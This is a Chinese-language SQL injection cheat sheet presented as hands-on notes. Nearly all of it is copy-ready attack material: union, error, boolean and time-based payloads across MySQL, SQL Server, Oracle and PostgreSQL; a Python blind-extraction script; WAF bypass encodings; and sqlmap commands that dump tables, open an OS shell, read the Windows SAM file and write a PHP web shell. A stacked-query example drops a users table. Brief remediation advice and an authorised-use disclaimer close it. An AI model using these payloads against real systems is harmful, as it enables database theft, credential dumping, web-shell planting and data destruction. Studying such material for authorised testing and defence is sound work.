# SQL 注入从入门到绕过（实战笔记）

## 1. 注入类型概览

| 类型 | 场景 | 判别 |
|------|------|------|
| 联合查询（Union-based） | 页面直接回显查询结果 | `?id=1 order by 3--` 判断列数，再 union select |
| 报错注入（Error-based） | 页面展示数据库错误 | `updatexml` / `extractvalue` / `floor` + `count(*)` |
| 布尔盲注（Boolean-based） | 页面真假状态（真/假页）不同 | `and 1=1`、`and 1=2`、`length(database())>5` |
| 时间盲注（Time-based） | 真假状态完全一致 | `sleep(5)`、`benchmark(1000000,md5(1))` |
| 堆叠查询（Stacked） | 支持多语句执行（`;`） | `1;drop table users--`（PHP+MySQL 较常见） |
| 二次注入 / 宽字节 / HTTP 头注入 | 特殊上下文 | 数据入库后再被使用，或编码差异造成注入 |

## 2. 判断注入点

```
?id=1'               # 报 SQL 语法错误 → 单引号可能未过滤
?id=1 and 1=1        # 正常
?id=1 and 1=2        # 异常 → 存在注入
?id=1' and '1'='1    # 字符串型注入
?id=1) or (1=1)-- -  # 括号型注入
?id=1\               # 探测转义
```

## 3. 联合查询注入

```sql
-- 判断列数（二分法 + order by）
?id=1 order by 10--   # 正常/错误 → 逐渐缩小范围

-- 判断回显位置
?id=-1 union select 1,2,3,4,5--

-- 基本信息
?id=-1 union select 1,@@version,@@datadir,user(),database()--

-- 库名 / 表名 / 列名（MySQL 5+ information_schema）
?id=-1 union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 0,1--
?id=-1 union select 1,column_name,3 from information_schema.columns where table_name=0x7573657273 limit 0,1--

-- 数据
?id=-1 union select username,password from users--
```

## 4. 报错注入

```sql
-- updatexml（最大 32 字符）
?id=1 and updatexml(1,concat(0x7e,user(),0x7e),1)

-- extractvalue
?id=1 and extractvalue(1,concat(0x7e,database(),0x7e))

-- floor + count + group by
?id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)
```

## 5. 布尔盲注

```sql
-- 数据库名长度
?id=1 and length(database())=5--

-- 数据库名逐位猜（ASCII）
?id=1 and ascii(substr(database(),1,1))=116--  # t

-- 常用脚本（Python）：二分法
import requests
for i in range(1,20):
    low,high = 32,127
    while low < high:
        mid = (low+high)//2
        url = f"http://target.com/?id=1 and ascii(substr(database(),{i},1))>{mid}"
        if "正常关键词" in requests.get(url).text:
            low = mid + 1
        else:
            high = mid
    print(chr(low), end='')
```

## 6. 时间盲注

```sql
-- MySQL
?id=1 and if(ascii(substr(database(),1,1))=116,sleep(5),1)--
?id=1 and benchmark(10000000,md5(1))

-- SQL Server
?id=1; WAITFOR DELAY '0:0:5'--

-- Oracle
?id=1 and 1=dbms_pipe.receive_message(('a'),5)--

-- PostgreSQL
?id=1; SELECT pg_sleep(5);--
```

## 7. WAF 绕过思路总结

### 7.1 关键字大小写 / 编码

```
?id=1 UnIoN SeLeCt 1,2,3
?id=1 %55nion(%53elect 1,2,3)
?id=1/*!50000select*/1,2,3
```

### 7.2 注释与空白

```
?id=1--
?id=1#
?id=1 /*foo*/
?id=1 union%09select%0a1,2,3
?id=1/*!UNION*/ /*!SELECT*/ 1,2,3
```

### 7.3 等价关键字

| 原关键字 | 替代 |
|----------|------|
| `and` / `or` | `&&` / `\|\|`、`xor`、`& 1` |
| `=` | `like` / `regexp` / `>x and <x+2` |
| `union select` | 盲注 / 报错 / DNSlog |
| `information_schema` | `sys.schema_table_statistics` / `sys.x$schema_flattened_keys` |
| `sleep` | `benchmark` / 大量正则运算 |
| `'` | 十六进制：`table_name=0x7573657273` |

### 7.4 HTTP 参数污染（HPP）

```
?id=1 union select 1,2&id=3  # 后端拼接后可能产生注入
```

### 7.5 其他奇技淫巧

- `%2527` 双编码（当后端进行两次解码时）
- `X-Forwarded-For: 127.0.0.1'`（XFF 注入）
- `User-Agent: mozilla/5.0 ' or 1=1--`
- `Cookie: id=1' and sleep(5)--`
- 分块传输（chunked Transfer-Encoding）绕过部分 WAF
- Content-Type 切换 `application/json` / `application/x-www-form-urlencoded`

## 8. sqlmap 使用速查

```bash
# 基本 GET
sqlmap -u "http://target.com/page?id=1" --batch --dbs

# POST
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --batch

# Cookie 注入
sqlmap -u "http://target.com/page" --cookie="id=1" --level 3

# 指定数据库类型、线程、风险等级
sqlmap -u "URL" --dbms=mysql --risk 3 --level 5 --threads 10

# Dump 指定库/表
sqlmap -u "URL" -D cms -T users --dump --batch

# OS-shell（需高权限 + 可写路径）
sqlmap -u "URL" --os-shell --batch

# 文件读写（需 FILE 权限）
sqlmap -u "URL" --file-read "c:/windows/system32/config/sam"
sqlmap -u "URL" --file-write="./shell.php" --file-dest "/var/www/html/shell.php"

# 绕过 WAF（tamper 脚本）
sqlmap -u "URL" --tamper=space2comment,apostrophemask,base64encode
```

## 9. 修复方案

1. **参数化查询 / 预编译语句**（根本解决）
2. **ORM 框架正确使用**，避免拼接 SQL
3. **输入校验**：白名单正则 + 长度限制
4. **输出编码**：页面回显数据库内容时做 HTML 编码
5. **最小权限账号**：应用账号仅授予 SELECT/INSERT，禁止 FILE/DROP
6. **WAF + RASP 防护**

---

> 本笔记仅用于合法授权的安全测试。请勿对未授权系统使用上述技术。
